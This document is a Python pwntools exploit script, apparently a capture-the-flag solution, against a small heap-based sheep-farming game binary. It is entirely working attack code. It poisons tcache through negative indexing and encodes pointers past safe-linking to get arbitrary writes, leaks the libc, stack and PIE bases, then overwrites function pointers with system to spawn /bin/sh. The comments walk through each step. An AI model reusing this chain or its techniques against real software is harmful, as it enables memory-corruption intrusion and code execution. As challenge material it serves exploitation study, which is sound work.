from pwn import *

def enc_ptr(addr, ptr):
    return ptr ^ (addr >> 12)

def buy_sheep(typ):
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'type> ', str(typ).encode())
    o = conn.recvline().decode()
    if 'sheep bought' in o:
        return int(o.split('index: ')[1])
    return o

def buy_sheep_no_grow(typ):
    idx = buy_sheep(typ)
    f, _ = view_sheep(idx)
    while True:
        f_, _ = view_sheep(idx)
        if f == f_:
            return idx
        sell_sheep(idx)
        idx = buy_sheep(idx)
        f, _ = view_sheep(idx)

def upgrade_sheep(idx, typ):
    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'index> ', str(idx).encode())
    conn.sendlineafter(b'type> ', str(typ).encode())

def sell_sheep(idx):
    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b'index> ', str(idx).encode())

def view_sheep(idx):
    conn.sendlineafter(b'> ', b'4')
    conn.sendlineafter(b'index> ', str(idx).encode())
    conn.recvline()
    fps = int(conn.recvline().decode().split('WPS: ')[1])
    val = int(conn.recvline().decode().split('Value: ')[1])
    return fps, val

def tick(n):
    conn.sendafter(b'> ', b'5\n' * n)

# def upgrade_write(idx, val):
#     for _ in range(64):
#         upgrade_sheep(idx, 2)
#     f_, _ = view_sheep(idx)
#     if f_ != 0:
#         print('Error f_ != 0 during upgrade_write, maybe not enough wool?')
#         exit(1)
#
#     for i in range(64):
#         upgrade_sheep(idx, 2)
#         if (val >> (64 - i - 1)) & 1:
#             upgrade_sheep(idx, 1)
#     f_, _ = view_sheep(idx)
#     if f_ != val:
#         print('Error f != val during upgrade_write, maybe not enough wool?')
#         exit(1)

# batched
def batch_upgrade_write(idx, vals):
    payload = []
    for v in vals:
        payload.append('2')
        payload.append(str(idx))
        payload.append(str(v))
    payload = '\n'.join(payload).encode()
    conn.sendlineafter(b'> ', payload)
    buy_sheep(99999)
    conn.recvuntil(b'That type of sheep doesn\'t exist...\n')
def upgrade_write(idx, val):
    vals = []
    for _ in range(64):
        vals.append(2)
    batch_upgrade_write(idx, vals)
    f_, _ = view_sheep(idx)
    if f_ != 0:
        print('Error f_ != 0 during upgrade_write, maybe not enough wool?')
        exit(1)

    vals = []
    for i in range(64):
        vals.append(2)
        if (val >> (64 - i - 1)) & 1:
            vals.append(1)
    batch_upgrade_write(idx, vals)
    f_, _ = view_sheep(idx)
    if f_ != val:
        print('Error f != val during upgrade_write, maybe not enough wool?')
        exit(1)

def write64(addr, val, tcache_entry_addr):
    # assumes there is at least one free chunk in tcache at idx -69
    # the strategy is to free a chunk into a tcache and then use negative
    # indexing to upgrade it and manipulate its fd ptr to the addr. then we can
    # allocate twice and the second one will point to the arbitrary address.
    #
    # to manipulate the fd ptr, we set it to 0 by upgrading with mult2 64 times,
    # then just double and add to get to the (tcache-protected) target addr
    #
    # returns idx of temp sheep used
    upgrade_write(-69, enc_ptr(tcache_entry_addr, addr))

    # malloc once, then the tcache head is pointing to our target addr
    idx = buy_sheep(0)
    upgrade_write(-69, val)

    return idx


# context.log_level = 'debug'
exe = ELF('../src/sheep')
libc = ELF('../src/libc.so.6')
conn = process('../src/sheep', cwd='../src')


# get rich
buy_sheep(0)
tick(1000)
for _ in range(5):
    upgrade_sheep(0, 2)
tick(1000)


# put pointer into tcache so we can leak it
sell_sheep(0)
f, _ = view_sheep(-69)
heapbase = f << 12
game_chunk = heapbase + 0x2a0
log.success(f'heap base: {hex(heapbase)}')


# we will leak libc by making a fake chunk with a larger size, so that when we
# free it it goes into unsorted bin and puts a libc address there. to achieve
# this we simply write some fake chunks and then free it. we need to satisfy
# some conditions (read glibc source code to see what those are)
idx = write64(heapbase + 0x800, 0x20, heapbase + 0x380) # write prev_size
sell_sheep(idx)
idx = write64(heapbase + 0x808, 0x1001, heapbase + 0x380) # write chunk_size
sell_sheep(idx)
idx = write64(heapbase + 0x808 + 0x1000, 0x51, heapbase + 0x380) # write adjacent chunk with prev bit set
sell_sheep(idx)
idx = write64(heapbase + 0x808 + 0x1000 + 0x50, 0x51, heapbase + 0x380) # write adjacent adjacent chunk with prev bit set
sell_sheep(idx)
idx = write64(game_chunk + 24 - 8 * 20, heapbase + 0x810, heapbase + 0x380)
sell_sheep(idx)
sell_sheep(-20)
# now libc addresses are at heapbase + 0x810
idx = write64(game_chunk + 24 - 8 * 20, heapbase + 0x810, heapbase + 0x360)
f, _ = view_sheep(-20)
libc_base = f - 0x21ace0
libc.address = libc_base
log.success(f'libc base: {hex(libc_base)}')


# leak stack by leaking the environ symbol in libc
idx = write64(game_chunk + 24 - 8 * 20, libc.sym['environ'], heapbase + 0x268)
sell_sheep(idx)
f, _ = view_sheep(-20)
stack_leak = f
log.success(f'stack leak: {hex(stack_leak)}')

# leak PIE from the stack
idx = write64(game_chunk + 24 - 8 * 20, stack_leak - 0x30, heapbase + 0x810)
sell_sheep(idx)
f, _ = view_sheep(-20)
pie_base = (f & 0x0000fffffffff000) - 0x1000
log.success(f'pie base: {hex(pie_base)}')
exe.address = pie_base


# overwrite all ability_func ptr with system so any allocated sheep's ability
# will be system since we are in the negatives here, they won't be called yet
system = libc_base + 0x50d70
abilities = exe.sym['abilities']
idx = write64(abilities, system, heapbase + 0x830)
sell_sheep(idx)
idx = write64(abilities+8, system, heapbase + 0x830)
sell_sheep(idx)
idx = write64(abilities+16, system, heapbase + 0x830)
sell_sheep(idx)

# make sure tcache head doesn't point back into abilities after writing
idx = write64(game_chunk + 24 + 8 * 10, 0, heapbase + 0x830)
sell_sheep(idx)

# choose a target then adjust that sheep's wps to be /bin/sh
buy_sheep(0)
idx_win_sheep = buy_sheep(0)
print('win sheep idx', idx_win_sheep)
upgrade_write(idx_win_sheep, u64(b'/bin/sh\x00'))


# write the target to a non-negative game->sheep index then increment num
# sheeps until it hits that point and system("/bin/sh") is triggered
idx = write64(game_chunk + 24 + 8 * 10, heapbase + 0x830, game_chunk + 24 + 8 * 10)
for _ in range(8):
    buy_sheep(0)

# gdb.attach(conn)
conn.interactive()
